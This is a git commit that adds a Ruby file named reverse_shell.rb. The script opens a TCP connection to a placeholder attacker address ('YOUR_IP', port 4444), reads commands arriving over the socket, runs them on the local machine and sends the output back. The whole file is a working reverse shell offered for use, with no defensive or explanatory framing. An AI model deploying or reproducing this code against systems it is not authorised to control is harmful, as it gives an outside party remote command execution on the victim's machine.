76680b6fc1a157e977dc68d85290e41be90e6ba5
Colkimi Mibey <141415279+Colkimi@users.noreply.github.com>
2025-04-16 19:55:36 +0300

    Create reverse_shell.rb

---
+++ reverse_shell.rb
@@ -0,0 +1,27 @@
+require 'socket'
+require 'open3'
+
+# Replace with your IP and port
+host = "YOUR_IP"
+port = 4444
+
+# Create a reverse TCP connection
+s = TCPSocket.new(host, port)
+
+# Redirect STDIN, STDOUT, STDERR to the socket
+s.puts "Connected!"
+loop do
+  cmd = s.gets.chomp
+  break if cmd.downcase == "exit"
+  
+  # Execute the command and send output back
+  begin
+    Open3.popen2e(cmd) do |_, stdout_err, _|
+      output = stdout_err.read
+      s.puts output
+    end
+  rescue => e
+    s.puts "Error: #{e.message}"
+  end
+end
+s.close
